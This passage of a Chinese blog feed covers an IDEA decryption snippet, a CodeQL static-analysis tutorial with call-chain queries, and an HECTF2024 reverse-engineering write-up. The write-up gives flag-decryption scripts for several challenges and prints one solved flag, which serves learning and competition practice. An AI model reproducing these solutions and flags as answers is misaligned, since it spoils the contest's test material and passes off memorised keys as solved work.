&quot;110111110100101101010100100010011000110001010001000000000000111011100000110011110000101001011001100001110000100010010110011011110011110010100010111100110011010000010110101101000111101011110111101001000110000010100001110101111100101000111010101110000100100011101100100101100110000011000111100010010000001001001001100000110111101111100011100011111111001001101111100010010100000101010111&quot;;</span><br><span class="hljs-string">    char Key[128] = &quot;01001110110010000111010101010110110101111011111010101001010010001011100010011110101000111100011111000010111100010011110000101110&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    uint16_t data[4*6];</span><br><span class="hljs-string">    uint16_t key[8];</span><br><span class="hljs-string"></span><br><span class="hljs-string">    convertStringToBin(Data, data, 4*6);</span><br><span class="hljs-string">    convertStringToBin(Key, key, 8);</span><br><span class="hljs-string">    for(int i=0;i&lt;8;i++)&#123;</span><br><span class="hljs-string">        printf(&quot;%x&quot;,key[i]);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Print initial data</span><br><span class="hljs-string">    printf(&quot;Initial data:   %04X %04X %04X %04Xn&quot;, data[0], data[1], data[2],</span><br><span class="hljs-string">         data[3]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Encrypt data</span><br><span class="hljs-string">    // IDEA(data, key, encrypt);</span><br><span class="hljs-string">    // printf(&quot;Encrypted data: %04X %04X %04X %04Xn&quot;, data[0], data[1], data[2],</span><br><span class="hljs-string">    //      data[3]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Decrypt data</span><br><span class="hljs-string">    for(int i=0;i&lt;6;i++) IDEA(data+4*i, key, decrypt);</span><br><span class="hljs-string">    for(int i=0;i&lt;24;i++) printf(&quot;%02x&quot;,data[i]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    return 0;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>codeQL静态分析</title>
    <link href="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    <url>/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>参考文档：<a href="https://www.cnblogs.com/Cl0ud/p/15803314.html">https://www.cnblogs.com/Cl0ud/p/15803314.html</a></p><p><a href="https://www.cnblogs.com/hac425/p/14556110.html">https://www.cnblogs.com/hac425/p/14556110.html</a></p><p><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a></p><p>官方文档：<a href="https://codeql.github.com/codeql-standard-libraries/cpp/">https://codeql.github.com/codeql-standard-libraries/cpp/</a></p><h1 id="codeql功能"><a href="#codeql功能" class="headerlink" title="codeql功能"></a>codeql功能</h1><p>把源代码转化成一个可查询的数据库，通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库，codeql的处理对象并不是源代码本身，而是中间生成的AST抽象语法树数据库，后续查询操作都在这个数据库中进行</p><h1 id="项目编译"><a href="#项目编译" class="headerlink" title="项目编译"></a>项目编译</h1><p>databases栏加载test数据库</p><p>在&#x2F;ql&#x2F;cpp&#x2F;ql&#x2F;src下创建一个test.ql来编写ql查询语句</p><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1733190891283-c9e6c415-4a7c-4bd4-9984-4718fcbe6e05.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建数据库</span><br>codeql database create databaseName --source-root=D:/xxljob --language=java<br><br><span class="hljs-comment">#更新数据库</span><br>codeql database upgrade databaseName<br><br><span class="hljs-comment">#执行扫描规则</span><br>codeql database analyze databasePath codeql-repo/java --<span class="hljs-built_in">format</span>=csv --output=result.csv<br><span class="hljs-comment">#eg:codeql database analyze ./libtiff1_dbjob /root/Codeql/ql/codeql/cpp/ql/src/Security/CWE --format=csv --output=result.csv</span><br></code></pre></td></tr></table></figure><h1 id="codeql语法"><a href="#codeql语法" class="headerlink" title="codeql语法"></a>codeql语法</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">import cpp<br>from FunctionCall fc<br>where fc.getTarget().getName().matches(<span class="hljs-string">&quot;cancel%&quot;</span>)<br>select fc.getEnclosingFunction(), fc <span class="hljs-comment">//fc.getEnclosingFunction() 获取包含该调用(cancel开头)的函数</span><br></code></pre></td></tr></table></figure><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1733756202089-a73faea0-0d44-45a3-a622-812ac61e8c8d.png" class="" title="img"><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>找到宏变量MAX_LENGTH的函数调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_LENGTH 100  </span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">printAndReturnLength</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <br>    <br>    <span class="hljs-built_in">strncpy</span>(buffer, str, BUFFER_SIZE - <span class="hljs-number">1</span>);<br>    buffer[BUFFER_SIZE - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String (up to %d chars): %s\n&quot;</span>, BUFFER_SIZE - <span class="hljs-number">1</span>, buffer);<br>    <br>    <br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">return</span> (length &gt; MAX_LENGTH) ? MAX_LENGTH : length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <br>    <br>    <span class="hljs-built_in">strncpy</span>(buffer, str, BUFFER_SIZE - <span class="hljs-number">1</span>);<br>    buffer[BUFFER_SIZE - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String (up to %d chars): %s\n&quot;</span>, BUFFER_SIZE - <span class="hljs-number">1</span>, buffer);<br>    <br>    <br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">return</span> (length &gt; MAX_LENGTH) ? MAX_LENGTH : length;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">callPrintAndReturnLength</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">int</span> length = printAndReturnLength(str);<br>    <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length of the string (up to %d): %d\n&quot;</span>, MAX_LENGTH, length);<br>    <br><br>    <span class="hljs-keyword">if</span> (length &gt; MAX_LENGTH) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Warning: String length exceeds the assumed maximum length of %d.\n&quot;</span>, MAX_LENGTH);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mainFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entering mainFunction\n&quot;</span>);<br>    <br><br>    <br>    callPrintAndReturnLength(str);<br>    print(str);<br>    <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exiting mainFunction\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>    <span class="hljs-type">char</span> testString[MAX_LENGTH + <span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Hello, Nested Function Calls with Macros!&quot;</span>;<br><br>    testString[MAX_LENGTH] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <br><br>    mainFunction(testString);<br><br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>.&#x2F;codeql database create demo_db –language&#x3D;cpp –source-root&#x3D;demo&#x2F; -c “gcc demo.c -o demo”</p><p>用两个谓词封装方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">import cpp<br><br>predicate <span class="hljs-title function_">functionUsesMacro</span><span class="hljs-params">(Function f)</span> &#123;<br>  exists(MacroInvocation mi |<br>    mi.getMacroName() = <span class="hljs-string">&quot;BUFFER_SIZE&quot;</span> and<br>    mi.getEnclosingFunction() = f<br>  )<br>&#125;<br><br>predicate <span class="hljs-title function_">callsChain</span><span class="hljs-params">(Function callee, Function caller)</span> &#123;<br>  <span class="hljs-comment">// Base case: caller calls the callee directly</span><br>  exists(FunctionCall fc |<br>    fc.getTarget() = callee and<br>    fc.getEnclosingFunction() = caller<br>  ) or<br>  <span class="hljs-comment">// Recursive case: continue tracing further up the call chain</span><br>  exists(Function intermediate |<br>    callsChain(callee, intermediate) and<br>    exists(FunctionCall fc2 |<br>      fc2.getTarget() = intermediate and<br>      fc2.getEnclosingFunction() = caller<br>    )<br>  )<br>&#125;<br><br>from Function start, Function caller<br>where<br>  <span class="hljs-title function_">functionUsesMacro</span><span class="hljs-params">(start)</span> <span class="hljs-title function_">and</span><br>  <span class="hljs-params">(</span><br><span class="hljs-params">    caller = start or</span><br><span class="hljs-params">    callsChain(start, caller)</span><br><span class="hljs-params">  )</span><br>select caller, &quot;Function in the chain.&quot;<br></code></pre></td></tr></table></figure><p>最后以树结构返回，上面的函数调用下面的函数</p><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1736391028586-85f962de-206b-46a8-9e29-f433205cac71.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>作业与项目总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HECTF2024</title>
    <link href="/2024/12/12/HECTF2024/"/>
    <url>/2024/12/12/HECTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="littleasm"><a href="#littleasm" class="headerlink" title="littleasm"></a>littleasm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>():<br>    key = <span class="hljs-string">b&quot;rev&quot;</span><br>    data = [<br>        <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x73</span>,<br>        <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5d</span>,<br>        <span class="hljs-number">0x21</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x3</span><br>    ]<br>    data_len = <span class="hljs-built_in">len</span>(data)<br><br>    flag = [<span class="hljs-number">0</span>] * data_len<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, data_len, <span class="hljs-number">3</span>):<br>        mod = (i + <span class="hljs-number">2</span>) % <span class="hljs-number">3</span><br>        flag[i] = (data[i] - <span class="hljs-number">0x2C</span>) ^ key[mod]<br><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; data_len:<br>            mod = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span><br>            flag[i + <span class="hljs-number">1</span>] = (data[i + <span class="hljs-number">1</span>] - <span class="hljs-number">0x8</span>) ^ key[mod]<br><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">2</span> &lt; data_len:<br>            mod = i % <span class="hljs-number">3</span><br>            flag[i + <span class="hljs-number">2</span>] = (data[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">0xC</span>) ^ key[mod]<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = decrypt_flag()<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>base64变表</p><img src="/2024/12/12/HECTF2024/1733537789184-de2a0721-c0ea-477e-8509-0f933e0ced36.png" class="" title="img"><p>异或之后直接比较</p><img src="/2024/12/12/HECTF2024/1733537820739-5a291895-a758-4331-9c98-1d0891d96128.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x51</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x28</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^(i//<span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/12/12/HECTF2024/1733537764726-1eeae5b1-6d18-429d-8911-2f324a2db54b.png" class="" title="img"><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>python反编译，所有exe开头都是4D4E</p><img src="/2024/12/12/HECTF2024/1733554725062-42a0a809-92ad-4677-9487-b65a61d4ce74.png" class="" title="img"><p>得到压缩包密码</p><img src="/2024/12/12/HECTF2024/1733554900622-90918cfc-4363-4e25-9166-8da32613fa97.png" class="" title="img"><p>发现是tea</p><img src="/2024/12/12/HECTF2024/1733554707733-3d4208ec-9a25-4e11-82f6-e1213727ecf2.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">int32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">1640531527</span>;<br>    <span class="hljs-type">uint32_t</span> sum = (<span class="hljs-number">-32</span>)*delta;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt;<span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x54434548</span>,<span class="hljs-number">0x32303246</span>,<span class="hljs-number">0x69617734</span>,<span class="hljs-number">0x756f7974</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xdf596194</span>,<span class="hljs-number">0x2cfe74d6</span>,<span class="hljs-number">0x1355ae4d</span>,<span class="hljs-number">0xb6717a87</span>,<span class="hljs-number">0xf27bb57b</span>,<span class="hljs-number">0x8d436c5</span>,<span class="hljs-number">0xc5c8e1af</span>,<span class="hljs-number">0xa85bd8f</span>,<span class="hljs-number">0x19a70032</span>,<span class="hljs-number">0x400cfef4</span>,<span class="hljs-number">0xaf02e1fc</span>,<span class="hljs-number">0xcdedcfb4</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>找到enc.png，rc4解密</p><img src="/2024/12/12/HECTF2024/1733555491063-0d9d2db9-e47d-4ed7-aab1-f6f1bafad97c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">key, data</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    result = <span class="hljs-built_in">bytearray</span>()<br><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        t = (S[i] + S[j]) % <span class="hljs-number">256</span><br>        result.append(byte ^ S[t])<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = <span class="hljs-string">b&quot;HECTF&quot;</span><br>    input_file = <span class="hljs-string">&quot;enc.png&quot;</span><br>    output_file = <span class="hljs-string">&quot;right.txt&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        encrypted_data = f.read()<br><br><br>    decrypted_data = rc4_decrypt(key, encrypted_data)<br><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密完成，结果已保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>修改后缀得到png</p><img src="/2024/12/12/HECTF2024/1733555418759-f9a911c2-bdf1-45f6-a256-46b5a608c5d0.png" class="" title="img"><p>分析CheckActivity</p><img src="/2024/12/12/HECTF2024/1733555449158-86438d73-535e-4726-9da4-9f8ea7eaa6f6.png" class="" title="img"><p>d0func中加载内存并调用func函数，注意内存初始值被修改了</p><img src="/2024/12/12/HECTF2024/1733573881631-b3a5c932-e123-4a7e-b322-3cdba779a4d8.png" class="" title="img"><p>交叉引用找到密文</p><img src="/2024/12/12/HECTF2024/1733573974883-8fea21bd-1431-418e-842a-6e9264abe5c0.png" class="" title="img"><p>和51c8异或</p><img src="/2024/12/12/HECTF2024/1733574004765-46c448a7-8e8a-4df8-a621-1003f4c65ecd.png" class="" title="img"><p>后面是标准aes</p><img src="/2024/12/12/HECTF2024/1733567594718-ed693b3e-ac05-4220-81e6-dd664a5646d5.png" class="" title="img"><p>通过交叉引用51c8找到tea，实际上没用，因为在aes后面</p><img src="/2024/12/12/HECTF2024/1733555402347-1d9a6c55-19db-4b69-a9f4-75c994fc1fcf.png" class="" title="img"><figure class="highlight python"><table><tr><td 